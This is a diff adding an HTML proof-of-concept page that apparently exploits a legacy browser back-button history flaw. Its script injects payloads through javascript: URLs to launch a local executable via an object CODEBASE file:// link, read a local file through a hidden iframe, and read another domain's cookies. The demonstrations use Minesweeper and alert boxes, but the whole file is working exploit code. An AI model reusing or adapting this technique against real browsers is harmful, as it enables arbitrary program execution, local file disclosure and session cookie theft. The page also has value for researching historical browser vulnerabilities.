@@ -1,0 +1,39 @@
+<html>
+<h1>Press link and then the backbutton to trigger script.</h1>
+<a href="javascript:execFile('file:///c:/winnt/system32/winmine.exe')">
+Run Minesweeper (c:/winnt/system32/winmine.exe Win2000 pro)</a><br>
+<a href="javascript:execFile('file:///c:/windows/system32/winmine.exe')">
+Run Minesweeper (c:/windows/system32/winmine.exe XP, ME etc...)</a><br>
+<a href="javascript:readFile('file:///c:/test.txt')">
+Read c:\test.txt (needs to be created)</a><br>
+<a href="javascript:readCookie('http://www.google.com/')">
+Read Google cookie</a>
+
+<script>
+// badUrl = "http://www.nonexistingdomain.se"; // Use if not XP
+badUrl = "res:";
+function execFile(file){
+  s = '<object classid=CLSID:11111111-1111-1111-1111-111111111111 ';
+  s+= 'CODEBASE='+file+'></OBJECT>';
+  backBug(badUrl,s);
+}
+function readFile(file){
+  s = '<iframe name=i src='+file+' style=display:none onload=';
+  s+= 'alert(i.document.body.innerText)></iframe>';
+  backBug(badUrl,s);
+}
+function readCookie(url){
+  s = '<script>alert(document.cookie);close();<"+"/script>';
+  backBug(url,s);
+}
+function backBug(url,payload){
+  len = history.length;
+  page = document.location;
+  s = "javascript:if (history.length!="+len+") {";
+  s+= "open('javascript:document.write(\""+payload+"\")')";
+  s+= ";history.back();} else '<script>location=\""+url
+  s+= "\";document.title=\""+page+"\";<"+"/script>';";
+  location = s;
+}
+</script>
+</html>
